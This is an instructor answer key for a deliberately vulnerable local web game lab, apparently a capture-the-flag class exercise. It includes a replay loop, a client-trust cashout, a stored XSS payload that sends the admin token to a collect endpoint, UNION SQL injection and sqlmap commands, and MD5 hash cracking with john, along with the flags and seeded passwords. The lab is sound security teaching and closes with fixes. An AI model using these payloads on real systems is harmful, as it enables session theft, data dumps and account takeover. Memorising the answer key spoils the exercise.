# MONSTER ARENA — Instructor Solution

Full walkthrough of the four planted stages. **Do not give this to students.**
Every command below was run against a fresh `node server.js` on
`http://localhost:3003` and verified to return its flag.

## Flags

| Flag | Value | Earned by |
|------|-------|-----------|
| F1 | `FLAG{replay_kill_highscore}` | replaying `POST /api/kill` until you enter the top 3 |
| F2 | `FLAG{stored_xss_admin_token}` | stored XSS in the podium announcement → steal the GameMaster token → `GET /api/me` |
| F3 | `FLAG{sqli_player_search_dump}` | UNION injection in `GET /api/players/search` dumping `secrets` |
| F4 | `FLAG{md5_rockyou_cracked}` | crack `pro_gamer_99`'s MD5, log in, read its `stash` |

Seeded accounts (MD5 of these is what the dump exposes):

| id | username | password | note |
|----|----------|----------|------|
| 1 | GameMaster | `Zx9#Qv!m2_Lp7` | **admin**; strong, NOT crackable — steal its session instead |
| 2 | xX_sniper_Xx | `iloveyou` | seeds the #2 podium wall (score 5200) |
| 3 | noob_slayer | `princess` | seeds the #3 podium wall (score 3100) |
| 4 | dark_knight | `password1` | |
| 5 | pro_gamer_99 | `qwerty` | **stash holds F4** |
| 6 | mike_the_tank | `monkey` | |
| 7 | lara_croft | `dragon` | |
| 8 | ghost_recon | `football` | |

---

## Stage 1 — Replay → F1

```bash
B=http://localhost:3003
TOK=$(curl -s -X POST $B/api/register -H 'Content-Type: application/json' \
  -d '{"username":"attacker","password":"pw"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')

# The #3 wall is 3100; each kill = +25 score, so ~125 replays crosses it.
for i in $(seq 1 130); do
  curl -s -X POST $B/api/kill -H "Authorization: Bearer $TOK" \
    -H 'Content-Type: application/json' -d '{"id":1}' \
    | grep -o 'FLAG{[^}]*}' && break || true
done
# -> FLAG{replay_kill_highscore} on the crossing kill
```

The flag fires **once**, on the kill that first makes `rank <= 3`. Legit play
cannot reach 3100 (1 tanky monster / 30s), which is the whole point.

**Two more roads to the podium (same stage, different bug flavours):**

```bash
# (a) CLIENT-TRUST: the loot backpack lives in the browser (localStorage
#     'ma_backpack'); /api/cashout banks whatever the client claims. One shot:
curl -s -X POST $B/api/cashout -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' -d '{"gold":999999}'
#  -> score jumps past 999999, rank 1, FLAG{replay_kill_highscore}
#     In the UI: DevTools -> Local Storage -> ma_backpack = {"gold":999999} -> press E.

# (b) REPLAY: that same cash-out request has no server-side loot to spend,
#     so resending it banks again every time.
```

Teaching contrast: (a) is "never trust the client", (b) is "make state changes
idempotent" — two different fixes for what looks like one cheat.

## Stage 2 — Stored XSS → steal GameMaster session → F2

The GameMaster (id 1) is "logged in" from boot; a jsdom **bot** (`server.js`,
`gameMasterBotTick`) renders new podium announcements every ~6s in a window that
holds the admin token in `localStorage`, through the same raw-name sink the game
client uses. Arm your name, hit the podium, read the drop box.

```bash
# arm displayName (python keeps the payload cleanly JSON-encoded)
python3 - "$TOK" <<'PY'
import json,sys,urllib.request
tok=sys.argv[1]
payload="<img src=x onerror=\"new Image().src='http://localhost:3003/api/collect?c='+localStorage.getItem('ma_token')\">"
req=urllib.request.Request("http://localhost:3003/api/account",
  data=json.dumps({"displayName":payload}).encode(), method="PATCH",
  headers={"Content-Type":"application/json","Authorization":"Bearer "+tok})
urllib.request.urlopen(req); print("armed")
PY

# (re)take the podium so the announcement fires with your payload as the name
for i in $(seq 1 130); do curl -s -X POST $B/api/kill -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' -d '{"id":1}' >/dev/null; done

sleep 8   # let the bot tick
STOLEN=$(curl -s $B/api/collect/peek | python3 -c 'import sys,json;print(json.load(sys.stdin)["captured"])')
curl -s $B/api/me -H "Authorization: Bearer $STOLEN"
# -> {... "role":"admin" ... "flag":"FLAG{stored_xss_admin_token}"}
```

The bot's window is shimmed so all common exfil primitives work — `<img onerror>`
+ `new Image().src`, `<svg onload>`, `fetch(...)`, `navigator.sendBeacon(...)` —
but every beacon is **clamped to localhost**, so nothing can leave the machine.
Point payloads at `/api/collect` (built-in) or the student's own listener on
localhost.

Teaching beat: the admin's password is uncrackable, yet the account fell in
seconds — because the **session** was stealable. Tie back to last section's
broken-authorization lesson.

## Stage 3 — SQL injection → F3

```bash
# any logged-in player can search; q is concatenated into the SQL
curl -s -o /dev/null -w '%{http_code}\n' -G $B/api/players/search \
  -H "Authorization: Bearer $TOK" --data-urlencode "q='"          # 500 (break)
curl -s -o /dev/null -w '%{http_code}\n' -G $B/api/players/search \
  -H "Authorization: Bearer $TOK" --data-urlencode "q=sniper"     # 200 (normal)

# 4-column UNION. dump the players table (MD5 hashes):
curl -s -G $B/api/players/search -H "Authorization: Bearer $TOK" \
  --data-urlencode "q=zzz' UNION SELECT id, username, password_md5, role FROM players-- "

# secrets table -> F3:
curl -s -G $B/api/players/search -H "Authorization: Bearer $TOK" \
  --data-urlencode "q=zzz' UNION SELECT id, label, value, NULL FROM secrets-- "
# -> FLAG{sqli_player_search_dump}
```

sqlmap finds it immediately (single quoted-string context, in-band UNION, clean
200/500 oracle, no error text):

```bash
sqlmap -u "$B/api/players/search?q=bob" --headers="Authorization: Bearer $TOK" \
  --dbms=sqlite --batch -T players --dump
```

## Stage 4 — Crack the MD5 → F4

The dump's hashes (for reference — students recover these, not you):

```
GameMaster    862f8a88fd404be01224e1be329e77c6   (Zx9#Qv!m2_Lp7 — will NOT crack)
xX_sniper_Xx  f25a2fc72690b780b2a14e140ef6a9e0   iloveyou
noob_slayer   8afa847f50a716e64932d995c8e7435a   princess
dark_knight   7c6a180b36896a0a8c02787eeafb0e4c   password1
pro_gamer_99  d8578edf8458ce06fbc5bb76a58c5ca4   qwerty      <- stash = F4
mike_the_tank d0763edaa9d9bd2a9516280e9044d885   monkey
lara_croft    8621ffdbc5698829397d97767ac13db3   dragon
ghost_recon   37b4e2d82900d5e94b8da524fbeb33c0   football
```

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show --format=raw-md5 hashes.txt

curl -s -X POST $B/api/login -H 'Content-Type: application/json' \
  -d '{"username":"pro_gamer_99","password":"qwerty"}'      # -> token
curl -s $B/api/me -H "Authorization: Bearer <token>"        # stash = FLAG{md5_rockyou_cracked}
```

---

## The fixes (talk through verbally — there is no secure-mode toggle)

| Stage | Fix |
|-------|-----|
| 1 Replay | idempotent, server-authoritative kills: one-time nonce per spawned monster, verified unspent + monster alive, atomically consumed; replay → 409. |
| 2 XSS | context-aware **output encoding** of the name at the sink (escape HTML, like the normal-chat branch). And keep session tokens in `HttpOnly` cookies so XSS cannot read them; add CSP. |
| 3 SQLi | **parameterize** the query — bind `q`, never concatenate. |
| 4 MD5 | slow salted KDF (bcrypt/argon2/scrypt) with per-user salt + real work factor. |
| 1b Auth | generic 401 for unknown-user and wrong-password alike; rate-limit + lockout; don't leak account existence. |

Full per-bug register with file:line is in `VULNERABILITIES.md`.
